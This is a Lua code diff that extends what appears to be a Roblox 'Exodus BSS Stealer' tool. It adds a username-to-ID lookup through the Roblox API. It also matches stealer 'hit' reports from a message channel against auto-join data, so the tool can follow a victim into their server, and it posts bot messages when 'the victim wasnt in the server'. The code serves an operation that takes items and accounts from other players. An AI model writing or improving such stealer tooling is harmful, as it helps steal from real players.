@@ -149,6 +149,32 @@ local function IsMarked(id)
     return table.find(Marked, id) ~= nil
 end
 
+local HttpService = game:GetService("HttpService")
+
+local function getUserId(username)
+    local response = http.request({
+        Url = "https://users.roblox.com/v1/usernames/users",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode({
+            usernames = {username},
+            excludeBannedUsers = false
+        })
+    })
+
+    local data = HttpService:JSONDecode(response.Body)
+
+    if data and data.data and data.data[1] then
+        return data.data[1].id
+    end
+
+    return nil
+end
+
+warn(getUserId("LOGGISpapaFANZ"))
+
 local function Scan(Tp, Json)
     local Messages = GetMessages()
     if Messages then
@@ -172,15 +198,17 @@ local function Scan(Tp, Json)
                     local AJdata = AutjoinData and game:GetService("HttpService"):JSONDecode(AutjoinData)
                     if AJdata then
                         local HitsMessage
+                        local UserID
                         local Messages = GetMessages(AutoCollect.ChannelID2, "100")
                         if Messages then
                             for _, msg in ipairs(Messages) do
                                 if msg.embeds and msg.embeds[1] and msg.embeds[1].title and msg.embeds[1].title:find("Exodus BSS Stealer") then
                                     HitsMessage = msg
+                                    UserID = getUserId(msg.embeds[1].fields[1].value:match("Username: **(.+)**"))
                                     break
                                 end
                             end
-                            if HitsMessage and not (HitsMessage.content or ""):find("Private Server") then
+                            if HitsMessage and not (HitsMessage.content or ""):find("Private Server") and UserID == AJdata.userid then
                                 if Tp and not IsMarked(msg.id) and AJdata.completed == nil then
                                     writefile("ExodusAutojoin", AutjoinData)
                                     SetMarked(msg.id)
@@ -297,6 +325,9 @@ task.spawn(function()
                 task.wait(1)
             end
         else
+            task.spawn(function()
+                PublishMessage(AutoCollect.BotInfoChannel, "The victim wasnt in the server")
+            end)
             warn("No victim")
             IsStealing = false
         end
